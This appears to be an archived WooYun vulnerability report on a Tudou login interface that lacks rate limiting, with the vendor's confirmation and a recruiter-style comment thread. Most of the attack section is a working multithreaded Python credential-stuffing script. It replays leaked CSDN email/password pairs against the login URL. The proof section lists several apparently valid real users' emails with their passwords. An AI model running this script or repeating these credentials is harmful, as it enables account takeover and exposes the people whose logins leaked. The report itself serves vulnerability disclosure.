{"id": 28637, "wybug_id": "wooyun-2015-0121803", "wybug_title": "土豆某处设计缺陷存在撞库", "wybug_corp": "土豆网", "wybug_author": "jaffer", "wybug_date": "2015-06-23 18:18", "wybug_open_date": "2015-08-07 18:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-07：\t细节向公众公开  简要描述： rt 详细说明：  接口：\nhttp://login.tudou.com//passport/ytLogin.do?jsoncallback=jQuery17203996445555239916_1434721317917&loginname=test&passwd=test&remember=1&from=http%3A%2F%2F114.80.122.152%3A8080%2F&_=1434721510212'\n对loginame和passwd进行爆破，没有限制，但是当重复提交次数超过500以上（具体多少没测试）会将IP地址进行限制。但是过一段时间又会解除限制。python fuzz代码：\n#!/usr/bin/env python#-*-coding:utf-8-*-import httplib2import urllib2import urllibimport socketimport socksfrom urllib import urlopenfrom string import replace,find,lowerfrom httplib import HTTPExceptionfrom urllib import urlencodeimport timeimport threadpoolimport threadingimport pdbimport traceback  pdb.set_trace()mutex = threading.Lock()class fuzz(object):\tdef __init__(self,user_pwd,count):\t\tself.user_pwd = user_pwd\t\tself.good = []\t\tself.count = count\t\tself.threadnum = 10\tdef makePackage(self,euser,epwd):\t\turl = 'http://login.tudou.com//passport/ytLogin.do?jsoncallback=jQuery17203996445555239916_1434721317917&loginname='+euser+'&passwd='+epwd+'&remember=1&from=http%3A%2F%2F114.80.122.152%3A8080%2F&_=1434721510212'\t\theaders = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',\t\t'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}\t\t\t\th = httplib2.Http()\t\ttry:\t\t\tres,con = h.request(url)\t\t\t\t\texcept Exception,ex:\t\t\tprint Exception,\":\",ex\t\t\ttraceback.print_exc()  \t\t\treturn\t\ti = con.find('success')\t\tt = []\t\tif i != -1:\t\t\tif mutex.acquire():\t\t\t\tself.good.append([euser,epwd])\t\t\t\tprint euser+':'+epwd+'\\n'\t\t\t\t\t\t\tmutex.release()\t\telse:\t\t\tpass\t\tdef preS(self):\t\tbase = 0\t\tfor each in self.user_pwd:\t\t\tself.makePackage(each[0],each[1][0:-1])\t\t\tif mutex.acquire():\t\t\t\tif len(self.good) != base:\t\t\t\t\tself.save()\t\t\t\t\tbase = len(self.good)\t\t\t\t\tmutex.release()\t\tdef save(self):\t\tfp = open('result','w')\t\tfor each in self.good:\t\t\tfp.writelines(each[0]+' '+each[1]+'\\n')\t\tfp.close()\t\tdef gothread(self):\t\t#建立进程池\t\tpool = threadpool.ThreadPool(self.threadnum)\t\t#两个list合并，直接相加就可以\t\tcount = 0\t\tbase = 0\t\tfor i in range(self.count):\t\t\tprint self.user_pwd[i][0]+'----user-----\\n' + self.user_pwd[i][1] + '---pass---\\n'\t\t\tif mutex.acquire():\t\t\t\tif len(self.good) != base:\t\t\t\t\tself.save()\t\t\t\t\tprint 'OK\\n'\t\t\t\t\tbase = len(self.good)\t\t\t\t\tmutex.release()\t\t\tpool.add_task(self.makePackage,self.user_pwd[i][0],self.user_pwd[i][1])\t\t#join and destroy all threads\t\tpool.destroy()\tif __name__=='__main__':\tf = open('csdn_email','r')\tup = []\tcount = 0\twhile True:\t\tline = f.readline()\t\tif line:\t\t\ti = line.find(' ')\t\t\tuser = line[0:i]\t\t\tpwd = line[i+1:]\t\t\tup.append([user,pwd])\t\t\tcount = count + 1\t\telse:\t\t\tbreak\tf.close()\ttest = fuzz(up,count)\ttest.preS()\n   漏洞证明：  因为只测试一次，用csdn邮箱以及密码进行测试。经过一轮测试得到的有效的用户密码：fstao@tom.com 730413jamstang@163.com jamstanglittlesong73@163.com Swhy920520horseplay@126.com my1316passgggxin@126.com xinghong\n\n\n\n\n\n\n\n   修复方案：  防撞库   版权声明：转载请注明来源 jaffer@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-06-23 18:40 厂商回复： 已知问题，多谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-24 14:33 |    \t\tjaffer \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:24        )\t\t \n  网络安全专家招聘信息：1、职位名称：网络安全技术专家2、所属部门：XX公司（深圳的世界五百强通信企业）3、部门员工数：50004、下属人数：项目负责制，下属人数不固定网络运营管理正在变化的台风口，内外部环境瞬息万变，网络安全正在面临巨大考验，世界各国均十分重视，对从业者是一个广阔空间、无限机遇、充满挑战且不断变化的领域。该岗位能充分发挥人才的技术特长，一方面可成长为公司内部该领域的引领者，另一方面随着公司在OSS领域的发展而提升人才在OSS领域业界安全的影响力。    \n     2015-09-24 14:34 |    \t\tjaffer \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:24        )\t\t \n  岗位职责：1.作为产品高端专家，针对网络运营管理产品，完成端到端安全解决方案、安全架构的提供和部署。在产品侧主导将安全功能、网络及基础设施转变为服务，转化为一切即服务（XaaS）解决方案，为产品客户能够预防安全风险、快速识别、消减安全风险。2.握网络安全技术的演进方向和发展趋势，识别关键安全性核心技术，具备大型软件系统安全性业务/技术规划能力，助力该业务领域安全性竞争力提前布局和储备。     \n     2015-09-24 14:34 |    \t\tjaffer \t\t\t( 实习白帽子  |\t\t\t        Rank:87 漏洞数:24        )\t\t \n  候选人条件：1. 具备成功开展跨产品族多个产品/重点版本的E2E安全性活动的经验，产品关键安全性质量属性达到业界领先水平。2. 熟练掌握相关产品管理、网络安全工程方法、网络安全关键技术、网络安全评估等相关知识和工作经验，并具备对团队网络安全设计进行领导的经验。3. 具备研究业界成熟的安全保障体系模型与实现方法的经验，熟悉虚拟化、云化、OS、DB、防病毒、IDS/IPS、攻防、 Web安全等相关技术及产品应用。4. 本科以上学历，不少于8年的领域工作经历(硕士/博士可适当放宽)，有较强的学习能力，良好的沟通协调能力，英语可作为工作语言。联系方式：18681480997 （刘先生）联系邮箱：liupeng923@163.com我们能够提供的职位：网络安全专家工作地点：要求国内（深圳、北京、上海、西安、南京、杭州、武汉、深圳、成都、）    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}